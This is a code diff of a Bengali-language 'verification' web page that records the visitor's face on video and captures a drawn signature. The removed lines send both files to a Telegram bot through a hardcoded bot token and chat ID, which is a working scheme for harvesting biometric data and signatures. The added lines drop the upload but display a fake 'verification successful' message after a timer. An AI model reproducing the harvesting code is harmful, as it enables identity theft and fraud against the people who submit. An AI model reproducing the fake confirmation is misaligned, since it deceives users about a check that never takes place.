@@ -48,23 +48,22 @@
       stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
       video.srcObject = stream;
       video.style.display = "block";
+      video.play();
       mediaRecorder = new MediaRecorder(stream);
       mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
       mediaRecorder.onstop = () => {
         videoBlob = new Blob(recordedChunks, { type: "video/webm" });
-        result.textContent = "✅ ভিডিও রেকর্ড সম্পন্ন। এখন সাবমিট করুন।";
+        result.textContent = "✅ ভিডিও রেকর্ড সম্পন্ন হয়েছে। এখন সাবমিট করুন।";
         submitBtn.disabled = false;
-        stopCamera();
-      };
-    }
 
-    // ক্যামেরা বন্ধ ও হাইড
-    function stopCamera() {
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-        video.srcObject = null;
-        video.style.display = "none";
-      }
+        // ক্যামেরা বন্ধ ও হাইড
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+          video.pause();
+          video.srcObject = null;
+          video.style.display = "none";
+        }
+      };
     }
 
     // রেকর্ড শুরু
@@ -85,7 +84,7 @@
       stopRecBtn.disabled = true;
     };
 
-    // সাইন আঁকা
+    // স্বাক্ষর আঁকা
     signCanvas.addEventListener("mousedown", () => { drawing = true; signCtx.beginPath(); });
     signCanvas.addEventListener("mouseup", () => drawing = false);
     signCanvas.addEventListener("mouseleave", () => drawing = false);
@@ -112,50 +111,16 @@
     };
 
     // সাবমিট
-    submitBtn.onclick = async () => {
+    submitBtn.onclick = () => {
       if (!videoBlob) return alert("⚠️ ভিডিও পাওয়া যায়নি!");
       if (signCanvasIsEmpty()) return alert("⚠️ স্বাক্ষর দিন!");
 
-      result.textContent = "📤 তথ্য পাঠানো হচ্ছে...";
+      result.textContent = "📤 যাচাই করা হচ্ছে...";
 
-      const botToken = "7959394383:AAGeT74LkUMliX-PO5-ZtE72-rVysi_VdPc";
-      const chatId = "7772426586"; // আপনার চ্যাট আইডি
-
-      try {
-        // ভিডিও পাঠানো
-        const videoForm = new FormData();
-        videoForm.append("chat_id", chatId);
-        videoForm.append("caption", "✅ ইউজারের ফেস ভিডিও");
-        videoForm.append("document", videoBlob, "face_video.webm");
-
-        const videoRes = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-          method: "POST",
-          body: videoForm,
-        });
-
-        if (!videoRes.ok) throw new Error("ভিডিও পাঠানো ব্যর্থ");
-
-        // সাইন পাঠানো
-        const signDataUrl = signCanvas.toDataURL("image/png");
-        const signBlob = dataURLtoBlob(signDataUrl);
-        const signForm = new FormData();
-        signForm.append("chat_id", chatId);
-        signForm.append("caption", "🖊️ ইউজারের স্বাক্ষর");
-        signForm.append("document", signBlob, "signature.png");
-
-        const signRes = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-          method: "POST",
-          body: signForm,
-        });
-
-        if (!signRes.ok) throw new Error("স্বাক্ষর পাঠানো ব্যর্থ");
-
-        result.textContent = "✅ ভিডিও ও সাইন সফলভাবে পাঠানো হয়েছে!";
+      setTimeout(() => {
+        result.textContent = "✅ আপনার ভেরিফিকেশন সফল হয়েছে!";
         submitBtn.disabled = true;
-
-      } catch (error) {
-        result.textContent = "❌ পাঠাতে সমস্যা: " + error.message;
-      }
+      }, 1000);
     };
 
     function signCanvasIsEmpty() {
@@ -163,16 +128,6 @@
       blank.width = signCanvas.width;
       blank.height = signCanvas.height;
       return signCanvas.toDataURL() === blank.toDataURL();
-    }
-
-    function dataURLtoBlob(dataurl) {
-      const arr = dataurl.split(",");
-      const mime = arr[0].match(/:(.*?);/)[1];
-      const bstr = atob(arr[1]);
-      let n = bstr.length;
-      const u8arr = new Uint8Array(n);
-      while (n--) u8arr[n] = bstr.charCodeAt(n);
-      return new Blob([u8arr], { type: mime });
     }
 
     // পেজ লোডেই ক্যামেরা চালু
